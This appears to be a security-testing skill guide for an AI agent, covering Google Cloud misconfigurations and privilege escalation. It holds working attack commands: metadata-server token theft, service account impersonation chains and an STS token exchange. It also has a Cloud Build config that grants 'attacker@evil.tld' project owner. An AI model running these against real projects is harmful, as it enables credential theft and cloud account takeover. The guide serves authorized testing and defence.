---
name: gcp
description: GCP cloud security testing covering IAM misconfigurations, public storage buckets, metadata abuse, and service account privilege escalation
---

# Google Cloud Platform (GCP)

GCP misconfigurations expose project data, service account keys, and lateral movement paths across Compute, Cloud Storage, Cloud Functions, and GKE. This skill covers direct GCP API testing and post-compromise enumeration from VMs/containers. For SSRF-mediated metadata access, combine with the `ssrf` skill.

## Attack Surface

**Identity**
- IAM policies: project/folder/org level bindings
- Service accounts, keys (JSON), Workload Identity, impersonation
- OAuth scopes on compute instances and Cloud Functions

**Storage & Data**
- Cloud Storage (GCS) buckets and objects
- BigQuery datasets, Cloud SQL instances, Firestore (see `firebase` skill)
- Secret Manager, Cloud KMS keys

**Compute**
- Compute Engine VMs, Cloud Run, Cloud Functions, GKE clusters
- Metadata server at `http://metadata.google.internal/computeMetadata/v1/`
- Startup scripts, instance templates, custom images

**Management**
- Cloud Console, gcloud CLI, Deployment Manager, Terraform state buckets
- Cloud Logging, Error Reporting, Cloud Build triggers

## Reconnaissance

**Credential Discovery**
- Service account JSON keys in repos, CI/CD, `.env`, backup buckets
- `GOOGLE_APPLICATION_CREDENTIALS` environment variable
- Default Compute Engine service account on VMs (often overprivileged)
- OAuth tokens in browser/local `gcloud` config (`~/.config/gcloud/`)

**Unauthenticated Enumeration**

Avoid `gsutil` for anonymous checks — it can use ambient `gcloud` or application-default credentials and produce false public-bucket findings. Unset `GOOGLE_APPLICATION_CREDENTIALS` and use unauthenticated HTTP instead.

```
# GCS bucket existence (403 = exists but private, 404 = not found/wrong region)
curl -I https://storage.googleapis.com/target-bucket/

# Anonymous listing (no Authorization header; confirms allUsers/allAuthenticatedUsers List)
curl https://storage.googleapis.com/target-bucket/

# Alternate URL forms
curl -I https://target-bucket.storage.googleapis.com/
```

**Authenticated Enumeration**
```
gcloud auth list
gcloud config get-value project
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list
gcloud storage ls
gcloud compute instances list
gcloud container clusters list
```

## Key Vulnerabilities

### Cloud Storage Misconfigurations

- Public buckets: `allUsers` or `allAuthenticatedUsers` with `roles/storage.objectViewer` or `objectAdmin`
- Listable buckets revealing object keys: backups, `.env`, `terraform.tfstate`, SA keys
- Uniform bucket-level access disabled with legacy ACL public-read
- Signed URL with excessive TTL or overly broad object prefix

**Test:**
```
gsutil iam get gs://BUCKET          # requires credentials
curl https://storage.googleapis.com/BUCKET/   # anonymous listing check
curl -I https://storage.googleapis.com/BUCKET/sensitive.sql
```

### IAM Privilege Escalation

Escalation is almost always "reach a more privileged service account" or
"grant yourself a role". Verify each with the policy simulator before firing.
The comprehensive set (largely the Rhino Security Labs GCP privesc research),
grouped by primitive:

**A. Mint credentials for a target SA (no `actAs` needed):**

| Permission | Escalation |
|------------|------------|
| `iam.serviceAccountKeys.create` | Create a JSON key for any SA → long-lived offline creds |
| `iam.serviceAccounts.getAccessToken` (`roles/…tokenCreator`) | `generateAccessToken` → short-lived OAuth token as the SA |
| `iam.serviceAccounts.signJwt` / `.signBlob` | Sign a JWT/blob as the SA → exchange for its token |
| `iam.serviceAccounts.getOpenIdToken` | Mint an OIDC token as the SA (reach WIF/IAP-trusting services) |
| `iam.serviceAccounts.implicitDelegation` | Chain token creation through an intermediate SA |
| `iam.serviceAccounts.setIamPolicy` | Self-grant `tokenCreator`/`actAs` on the SA, then mint |

**B. Deploy code that runs as a privileged SA (each needs `iam.serviceAccounts.actAs` on that SA plus the create/update perm):**

| Permission | Escalation |
|------------|------------|
| `compute.instances.create` | VM with the SA attached + a startup script that curls its metadata token |
| `compute.instances.setMetadata` / `.setServiceAccount` | Add startup script / SSH key, or swap the SA, on an existing VM |
| `cloudfunctions.functions.create`/`.update` (+ `.call` or `.setIamPolicy`) | Function body runs as the SA |
| `run.services.create`/`.update` | Cloud Run service runs as the SA |
| `cloudbuild.builds.create` | Build steps run as the Cloud Build SA (see Cloud Build section) |
| `deploymentmanager.deployments.create` | Deployment Manager runs as the SA |
| `composer.environments.create` / `dataproc.clusters.create` / `dataflow` / `ml.jobs.create` / `cloudscheduler.jobs.create` / `appengine` | Job/env runs as the SA |

**C. Grant yourself IAM directly:**

| Permission | Escalation |
|------------|------------|
| `resourcemanager.projects.setIamPolicy` | Bind yourself `roles/owner` on the project |
| `resourcemanager.folders.setIamPolicy` / `.organizations.setIamPolicy` | Self-grant at folder/org scope (inherits down) |
| `iam.roles.update` | Add any permission to a custom role you already hold |
| `storage.buckets.setIamPolicy` | Open a bucket to yourself / `allUsers` |

**D. Data/secret access without escalation:**

| Permission | Escalation |
|------------|------------|
| `secretmanager.versions.access` | Read secret values |
| `cloudkms.cryptoKeyVersions.useToDecrypt` | Decrypt ciphertext/keys |
| `storage.hmacKeys.create` | Mint S3-interop HMAC keys for an SA with storage access |

**Test:**
```bash
gcloud projects get-iam-policy PROJECT --flatten="bindings[].members" --filter="bindings.members:user:YOU"
gcloud iam roles list --project=PROJECT
# prove an actAs deploy path: mint a token as the target SA via impersonation
gcloud iam service-accounts get-iam-policy TARGET_SA@PROJECT.iam.gserviceaccount.com
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com
```

### Workload Identity Federation Abuse

WIF lets an external OIDC/SAML identity (GitHub Actions, GitLab CI, AWS, any
OIDC IdP) impersonate a GCP SA with **no key** — the trust is a pool +
provider with an attribute mapping and (should-be) a condition. Misconfigured
pools are keyless account takeover:

- **Missing/loose attribute condition** — a provider that maps
  `google.subject = assertion.sub` but sets no `attribute-condition` (or one
  that is always true) trusts *any* token from that issuer. If the issuer is a
  public OIDC provider (GitHub's `token.actions.githubusercontent.com`), an
  attacker mints a token from **their own** repo/workflow and exchanges it.
- **Unpinned audience / issuer** — provider not restricting `aud` to the pool,
  or accepting a broad issuer, lets tokens minted for another purpose be
  replayed.
- **Over-broad mapping** — mapping an attacker-controllable claim
  (`assertion.repository_owner`, a self-set `assertion.email`) into the
  condition. Confirm the exact CEL condition on the provider.

```bash
# enumerate pools/providers and read the mapping + condition
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers describe PROVIDER \
  --workload-identity-pool=POOL --location=global   # inspect attributeMapping + attributeCondition
# exchange an external OIDC token for a GCP SA token (STS)
curl -s -X POST https://sts.googleapis.com/v1/token -d \
 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange&audience=//iam.googleapis.com/projects/NUM/locations/global/workloadIdentityPools/POOL/providers/PROVIDER&scope=https://www.googleapis.com/auth/cloud-platform&requested_token_type=urn:ietf:params:oauth:token-type:access_token&subject_token_type=urn:ietf:params:oauth:token-type:jwt&subject_token=<EXTERNAL_OIDC_JWT>'
# then impersonate the mapped SA with the returned federated token
```

### Cloud Build / Deploy Privilege Escalation

Cloud Build is a top escalation target because its builds run as a powerful
service account and `cloudbuild.builds.create` is often handed out broadly:

- The **default Cloud Build SA** (`<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`)
  historically held `roles/editor` project-wide (newer projects tighten this —
  confirm its bindings). `cloudbuild.builds.create` lets you submit a build
  whose steps run arbitrary commands as that SA:
  ```bash
  cat > cloudbuild.yaml <<'EOF'
  steps:
  - name: gcr.io/cloud-builders/gcloud
    entrypoint: bash
    args: ['-c', 'gcloud auth print-access-token; gcloud projects add-iam-policy-binding PROJECT --member=user:attacker@evil.tld --role=roles/owner']
  EOF
  gcloud builds submit --no-source --config cloudbuild.yaml
  ```
- Builds can read Secret Manager secrets referenced in the config and any
  bucket/artifact the build SA can reach; the build logs bucket may itself be
  over-shared.
- Cloud Deploy pipelines and Cloud Build **triggers** wired to a repo:
  push/PR to a trusted branch runs the pipeline as its SA — a source-write or
  trigger-edit permission becomes code execution as that SA.

### Metadata Server Abuse

From any code execution on a GCP VM, Cloud Run (if metadata accessible), or compromised pod:

```
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

- Default compute SA may have `editor` role on project (legacy projects)
- Requested OAuth scopes may allow `cloud-platform` full access
- Workload Identity misconfiguration in GKE → cross-namespace SA token theft

### GKE Misconfigurations

- Dashboard/UI exposed, anonymous RBAC (see `kubernetes` skill for K8s layer)
- Workload Identity not enforced; pods use node SA with broad GCP permissions
- `kubectl` proxy or `kubelet` read-only port exposed
- Secrets in ConfigMaps; GCR/Artifact Registry images pulling without auth

### Cloud Functions / Cloud Run

- HTTP-triggered functions without authentication (`--allow-unauthenticated`)
- Environment variables containing API keys (`gcloud functions describe`)
- Overprivileged runtime service account (`roles/editor`)
- Event triggers accepting attacker-controlled Pub/Sub messages

### BigQuery & Cloud SQL

- Public datasets (`allUsers` on dataset IAM)
- Cloud SQL public IP with weak/no password
- Exported snapshots in public GCS buckets

### Secret Manager & KMS

- `secretmanager.versions.access` granted to unintended principals
- Secrets replicated to logs via misconfigured Cloud Functions env vars
- KMS cryptoKey IAM with `allAuthenticatedUsers`

## Advanced Techniques

**Terraform State in GCS**
- `terraform.tfstate` in listable bucket → all resource addresses, sometimes secrets in plain text

**Service Account Impersonation Chain**
- `roles/iam.serviceAccountTokenCreator` on target SA → short-lived access tokens
- Impersonation chains across SAs: if you can impersonate SA1, SA1 can
  impersonate SA2, and SA2 holds owner, walk the chain. `gcloud` supports a
  delegation chain directly:
  ```bash
  # you -> intermediate SA -> final privileged SA
  gcloud auth print-access-token \
    --impersonate-service-account=FINAL_SA@P.iam.gserviceaccount.com \
    --delegates=INTERMEDIATE_SA@P.iam.gserviceaccount.com
  ```
  `iam.serviceAccounts.implicitDelegation` on an intermediate SA enables the
  hop even without a direct `tokenCreator` on the final SA. Map the SA→SA
  `tokenCreator` graph across the project to find the shortest path to owner.

**Org Policy and IAM Conditions Gaps**
- Project-level deny policies not applied; child project inherits permissive folder IAM
- **IAM Conditions (CEL) bypass** — a conditional binding
  (`resource.name.startsWith('projects/_/buckets/prod-')`,
  `request.time < ...`, IP/tag conditions) is only as tight as the CEL. Test a
  resource name that satisfies the prefix but is not what the author intended,
  a time window that is currently open, or a request that omits the attribute
  the condition inspects (missing attribute can evaluate permissively). Read
  every `condition` block in `get-iam-policy` output, not just the role.
- **Org policy constraints** (`constraints/iam.disableServiceAccountKeyCreation`,
  `iam.allowedPolicyMemberDomains`, `compute.vmExternalIpAccess`) are the org's
  guardrails — check whether they are set and enforced at the tested scope, and
  whether `orgpolicy.policy.set` (or Owner at a parent scope) lets you relax
  them. A constraint absent at the project level is a gap even when the org
  default looks safe.

## Testing Methodology

1. **Discover credentials** — Keys in code, metadata, SSRF, public buckets
2. **Identify principal** — `gcloud auth list`, effective project IAM
3. **Enumerate storage** — Public/listable buckets, sensitive object names
4. **Escalation paths** — Map `actAs`, key creation, function deploy permissions
5. **Metadata** — From any shell in GCP workload, fetch SA token and scopes
6. **GKE layer** — Pivot from GCP IAM to cluster (combine with `kubernetes` skill)

## Validation

1. Demonstrate unauthorized GCS object read/list with bucket URL and object key
2. Show IAM escalation path with exact role/member binding and resulting access
3. Prove metadata token theft from compute context with redacted token scope
4. Document project ID, resource name, and IAM binding root cause
5. Confirm fix blocks the specific principal/permission/resource combination

## False Positives

- Intentionally public static asset bucket with no sensitive objects
- Metadata server unreachable from tested context (no RCE/SSRF)
- SA token from metadata has only `devstorage.read_only` on single bucket (note scope, not full breach)
- `403` on bucket HEAD indicating existence but not readable content

## Impact

- Mass data exfiltration from GCS/BigQuery/Cloud SQL backups
- Project or org compromise via SA key theft or IAM escalation
- Lateral movement from GKE pod to cloud control plane
- Regulatory exposure (PII in public buckets or exports)

## Pro Tips

1. Always check both `gsutil iam get` and anonymous `curl` — IAM and ACL layers differ
2. Search public buckets for `*.json` service account keys and `terraform.tfstate`
3. Default compute SA email: `PROJECT_NUMBER-compute@developer.gserviceaccount.com`
4. Combine with `kubernetes` skill when target runs on GKE
5. Firebase-hosted apps often use GCP project underneath — pivot from web to GCP project ID in configs

## Tooling

`gcloud`/`gsutil` are the primary tools (used throughout). Add these for
enumeration at scale — install with `pipx`/`pip`; the sandbox has build-time
egress.

- **GCPBucketBrute** (Rhino Security Labs) — unauthenticated + authenticated
  GCS bucket enumeration and per-bucket permission check from a keyword:
  ```bash
  python3 gcpbucketbrute.py -k companyname -u        # -u = unauthenticated
  ```
- **gcp_scanner** (Google) — from a stolen credential (SA key, refresh token,
  or gcloud config), enumerates exactly what that principal can reach across
  services; the fastest "what can I do from here" after a foothold:
  ```bash
  python3 scanner.py -k ./sa-key.json -o out/        # also -g for gcloud creds
  ```
- **ScoutSuite** (NCC) — multi-service config audit → HTML report flagging
  public buckets, over-broad IAM, default-SA usage, open firewall rules:
  ```bash
  scout gcp --service-account ./sa-key.json          # or --user-account
  ```
- **Rhino GCP-IAM-Privilege-Escalation** — the exploit scripts backing the
  privesc table above (`ExploitScripts/` per method); use to automate a proven
  `actAs`/key-create/setIamPolicy path.
- **hayat** — GCP config/audit-log analysis for a captured project; useful for
  turning Cloud Logging access into an activity/misconfig picture.

Prefer read-only enumeration first (`gcp_scanner`, ScoutSuite), then run a
single targeted privesc script rather than spraying — GCP Admin Activity logs
are on by default and every `setIamPolicy`/key-create is recorded.

## Summary

GCP security requires least-privilege IAM, no public data paths, tight metadata/scopes on compute, and protected service account keys. Enumerate from any credential or shell — even read-only GCS access often reveals escalation artifacts.
